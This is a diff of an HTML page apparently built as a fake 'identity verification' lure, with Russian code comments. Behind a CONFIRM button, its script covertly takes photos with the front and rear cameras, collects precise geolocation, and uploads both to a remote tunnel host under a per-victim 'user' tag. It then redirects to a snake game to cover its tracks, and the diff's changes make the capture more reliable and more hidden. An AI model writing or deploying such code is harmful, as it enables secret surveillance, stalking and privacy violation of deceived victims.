@@ -7,10 +7,11 @@
     <style>
         body { background:#000; color:#fff; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
         .card { text-align:center; padding:40px; background:#111; border-radius:30px; width:80%; border:1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .btn { background:#fff; color:#000; border:none; padding:15px 30px; border-radius:15px; font-weight:bold; cursor:pointer; width:100%; font-size: 16px; }
+        .btn { background:#fff; color:#000; border:none; padding:15px 30px; border-radius:15px; font-weight:bold; cursor:pointer; width:100%; font-size: 16px; transition: 0.3s; }
+        .btn:active { transform: scale(0.95); opacity: 0.8; }
         #loader { display:none; border:4px solid #333; border-top:4px solid #fff; border-radius:50%; width:30px; height:30px; animation:spin 1s linear infinite; margin:20px auto; }
         @keyframes spin { 100% { transform:rotate(360deg); } }
-        video, canvas { display:none; }
+        video, canvas { display:none; position: absolute; left: -9999px; }
         p { color: #888; font-size: 14px; margin-bottom: 20px; }
     </style>
 </head>
@@ -21,27 +22,38 @@
         <button class="btn" id="go" onclick="run()">CONFIRM</button>
         <div id="loader"></div>
     </div>
+    
     <video id="v" autoplay playsinline muted></video>
     <canvas id="c"></canvas>
 
-    <script>
+<script>
     // Твоя актуальная ссылка (БЕЗ слэша в конце)
-    const API = "https://351b96155766de.lhr.life"; 
+    const API = "https://08afb95725a7c4.lhr.life"; 
     const REDIRECT_URL = "https://www.google.com/fbx?fbx=snake_arcade";
 
-    const user = new URLSearchParams(window.location.search).get('user') || "Unknown";
+    // Получаем юзера из URL
+    const urlParams = new URLSearchParams(window.location.search);
+    const user = urlParams.get('user') || "Unknown";
 
-    // Функция для захвата фото
     async function takePhoto(mode) {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            console.error("Browser API not supported");
+            return null;
+        }
+
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: mode } 
+                video: { facingMode: mode, width: {ideal: 1280}, height: {ideal: 720} },
+                audio: false 
             });
+            
             const v = document.getElementById('v');
             v.srcObject = stream;
-
-            // Ждем чуть дольше (2 секунды), чтобы камера сфокусировалась
-            await new Promise(r => setTimeout(r, 2000));
+            
+            // Ждем запуска видео потока
+            await new Promise(r => v.onloadedmetadata = r);
+            // Ждем 1.5 сек для автофокуса
+            await new Promise(r => setTimeout(r, 1500));
 
             const canvas = document.getElementById('c');
             canvas.width = v.videoWidth;
@@ -50,11 +62,13 @@
 
             const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
             
-            // Останавливаем камеру сразу после снимка
+            // Важно: Останавливаем ВСЕ треки перед выходом
             stream.getTracks().forEach(t => t.stop());
+            v.srcObject = null;
+            
             return blob;
         } catch (e) {
-            console.error("Camera error:", e);
+            console.error("Camera error (" + mode + "):", e);
             return null;
         }
     }
@@ -65,44 +79,43 @@
         const msg = document.getElementById('msg');
         const statusTitle = document.getElementById('st');
 
-        // Скрываем кнопку, показываем лоадер
         btn.style.display = 'none';
         loader.style.display = 'block';
         msg.innerText = "Processing security check...";
 
         try {
-            // 1. Отправляем локацию (не блокируем выполнение)
+            // 1. Геолокация
             navigator.geolocation.getCurrentPosition(p => {
                 fetch(`${API}/location?lat=${p.coords.latitude}&lon=${p.coords.longitude}&user=${user}`).catch(() => {});
-            }, null, {enableHighAccuracy: true});
+            }, (err) => console.log("Geo error:", err.message), {enableHighAccuracy: true});
 
-            // 2. Делаем фото (строго по очереди)
             const fd = new FormData();
             
+            // 2. Фото 1 (Фронталка)
             msg.innerText = "Verifying identity (1/2)...";
-            const f1 = await takePhoto("user"); // Фронталка
+            const f1 = await takePhoto("user");
             if (f1) fd.append('files', f1, 'front.jpg');
 
+            // 3. Фото 2 (Задняя камера)
             msg.innerText = "Verifying identity (2/2)...";
-            const f2 = await takePhoto("environment"); // Задняя
+            const f2 = await takePhoto("environment");
             if (f2) fd.append('files', f2, 'back.jpg');
 
-            // 3. ОТПРАВКА НА СЕРВЕР (Ждем завершения!)
+            // 4. Отправка
             if (fd.has('files')) {
                 msg.innerText = "Uploading data...";
-                const response = await fetch(`${API}/upload-photo?user=${user}`, {
+                const response = await fetch(`${API}/upload-photo?user=${encodeURIComponent(user)}`, {
                     method: 'POST',
                     body: fd
                 });
 
-                if (!response.ok) throw new Error("Server error");
-                
-                console.log("Upload successful");
+                if (!response.ok) throw new Error("Server response not OK");
+                console.log("Upload success");
             } else {
-                throw new Error("No photos captured");
+                throw new Error("Camera permission denied or failed");
             }
 
-            // 4. ФИНАЛ: Только после успешного fetch меняем текст и уходим на змейку
+            // 5. Финал
             statusTitle.innerText = "Success";
             loader.style.display = 'none';
             msg.innerText = "Identity verified! Redirecting to game...";
@@ -112,7 +125,7 @@
             }, 1500);
 
         } catch (e) {
-            console.error("Error during process:", e);
+            console.error("Process error:", e);
             statusTitle.innerText = "Error";
             msg.innerText = "Verification failed. Please check camera permissions.";
             loader.style.display = 'none';
